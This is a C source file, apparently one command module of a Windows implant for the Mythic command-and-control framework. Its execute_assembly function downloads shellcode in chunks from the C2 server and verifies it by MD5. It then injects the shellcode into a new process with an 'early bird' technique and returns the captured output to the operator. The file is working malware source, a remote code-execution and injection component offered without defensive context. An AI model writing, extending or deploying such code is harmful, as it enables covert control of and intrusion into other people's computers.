#define _WIN32_WINNT 0x0601
#include "commands.h"
#include "inject.h"
#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

#define EA_CHUNK_SIZE (4 * 1024 * 1024)

static char *ea_extract_b64(const char *json, const char *key) {
    char pat[72];
    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    const char *start = strstr(json, pat);
    if (!start) return NULL;
    start += strlen(pat);
    const char *end = strchr(start, '"');
    if (!end) return NULL;
    size_t len = (size_t)(end - start);
    char *result = (char *)malloc(len + 1);
    if (!result) return NULL;
    memcpy(result, start, len);
    result[len] = '\0';
    return result;
}

static int ea_extract_int(const char *json, const char *key, int defval) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *kp = strstr(json, pat);
    if (!kp) return defval;
    const char *vp = strchr(kp, ':');
    if (!vp) return defval;
    while (*++vp == ' ' || *vp == '\t');
    return atoi(vp);
}

static int ea_md5_hex(const unsigned char *data, size_t len, char out[33]) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE       hash[16];
    DWORD      hashLen = 16;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0); return 0;
    }
    if (!CryptHashData(hHash, data, (DWORD)len, 0)) {
        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return 0;
    }
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return 0;
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    for (int i = 0; i < 16; i++)
        snprintf(out + i * 2, 3, "%02x", hash[i]);
    out[32] = '\0';
    return 1;
}


void command_execute_assembly(char *task_id, char *params) {
    char file_id[128]     = {0};
    char expected_md5[64] = {0};
    int  sc_chunk_size    = EA_CHUNK_SIZE;

    extract_json_string(params, "file",          file_id,      sizeof(file_id));
    extract_json_string(params, "shellcode_md5", expected_md5, sizeof(expected_md5));
    {
        int v = ea_extract_int(params, "sc_chunk_size", 0);
        if (v > 0) sc_chunk_size = v;
    }

    if (!file_id[0]) {
        send_task_response(task_id, "Error: no shellcode file provided");
        return;
    }

    unsigned char *shellcode     = NULL;
    size_t         shellcode_len = 0;

    {
        int total_chunks = -1;
        int chunk_num    = 1;
        while (1) {
            char json_msg[2048];
            if (chunk_num == 1 || total_chunks <= 0) {
                snprintf(json_msg, sizeof(json_msg),
                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                    "\"chunk_num\":%d,\"full_path\":\"<execute_assembly>\"}}]}",
                    task_id, sc_chunk_size, file_id, chunk_num);
            } else {
                snprintf(json_msg, sizeof(json_msg),
                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                    "\"status\":\"Downloading assembly: chunk %d / %d\","
                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                    "\"chunk_num\":%d,\"full_path\":\"<execute_assembly>\"}}]}",
                    task_id, chunk_num, total_chunks,
                    sc_chunk_size, file_id, chunk_num);
            }
            char *b64_resp = send_c2_message(json_msg);
            if (!b64_resp) { free(shellcode); send_task_response(task_id, "Error: C2 unreachable"); return; }
            char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
            free(b64_resp);
            if (!json_resp) { free(shellcode); send_task_response(task_id, "Error: decrypt failed"); return; }
            if (chunk_num == 1) {
                total_chunks = ea_extract_int(json_resp, "total_chunks", -1);
                if (total_chunks <= 0) {
                    free(json_resp); free(shellcode);
                    send_task_response(task_id, "Error: failed to retrieve shellcode from Mythic");
                    return;
                }
            }
            char *b64_chunk = ea_extract_b64(json_resp, "chunk_data");
            free(json_resp);
            if (!b64_chunk) { free(shellcode); send_task_response(task_id, "Error: missing chunk_data"); return; }
            size_t         decoded_len = 0;
            unsigned char *decoded     = base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
            free(b64_chunk);
            if (decoded && decoded_len > 0) {
                unsigned char *tmp2 = realloc(shellcode, shellcode_len + decoded_len);
                if (!tmp2) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
                shellcode = tmp2;
                memcpy(shellcode + shellcode_len, decoded, decoded_len);
                shellcode_len += decoded_len;
                free(decoded);
            }
            if (chunk_num >= total_chunks) break;
            chunk_num++;
        }
        if (!shellcode || shellcode_len == 0) {
            free(shellcode);
            send_task_response(task_id, "Error: empty shellcode");
            return;
        }
    }

    char actual_md5[33] = {0};
    if (!ea_md5_hex(shellcode, shellcode_len, actual_md5)) {
        SecureZeroMemory(shellcode, shellcode_len);
        free(shellcode);
        send_task_response(task_id, "Error: MD5 computation failed (WinCrypt)");
        return;
    }
    if (expected_md5[0] && _stricmp(actual_md5, expected_md5) != 0) {
        char msg[256];
        snprintf(msg, sizeof(msg),
                 "Error: MD5 mismatch\n  received: %s\n  expected: %s",
                 actual_md5, expected_md5);
        SecureZeroMemory(shellcode, shellcode_len);
        free(shellcode);
        send_task_response(task_id, msg);
        return;
    }

    EarlyBirdResult inj    = {0};
    char            injerr[256] = {0};
    DEBUG_PRINT("[EA] calling earlybird_inject sc_len=%zu capture=1", shellcode_len);
    if (!earlybird_inject(shellcode, shellcode_len, NULL, 1, &inj, injerr, sizeof(injerr))) {
        SecureZeroMemory(shellcode, shellcode_len);
        free(shellcode);
        send_task_response(task_id, injerr);
        return;
    }
    SecureZeroMemory(shellcode, shellcode_len);
    free(shellcode);
    DEBUG_PRINT("[EA] inject ok pid=%lu", (unsigned long)inj.pid);

    /* Drain pipe output (polls until process exits) then collect exit code */
    DEBUG_PRINT("[EA] inject ok pid=%lu, draining pipe", (unsigned long)inj.pid);
    char *result = NULL;
    if (inj.hPipeRead) {
        result = read_pipe_output(inj.hPipeRead, inj.hProcess);
        CloseHandle(inj.hPipeRead);
    }
    DWORD exit_code = 0xDEAD;
    GetExitCodeProcess(inj.hProcess, &exit_code);
    CloseHandle(inj.hThread);
    CloseHandle(inj.hProcess);
    DEBUG_PRINT("[EA] done exit_code=0x%lX output_len=%zu",
                (unsigned long)exit_code, result ? strlen(result) : 0);

    if (!result || !result[0]) {
        free(result);
        char diag[64];
        snprintf(diag, sizeof(diag), "(no output) [exit_code=0x%lX]", (unsigned long)exit_code);
        send_task_response(task_id, diag);
    } else {
        send_task_response(task_id, result);
        free(result);
    }
    DEBUG_PRINT("[EA] execute_assembly done");
}

#endif /* INCLUDE_CMD_EXECUTE_ASSEMBLY */
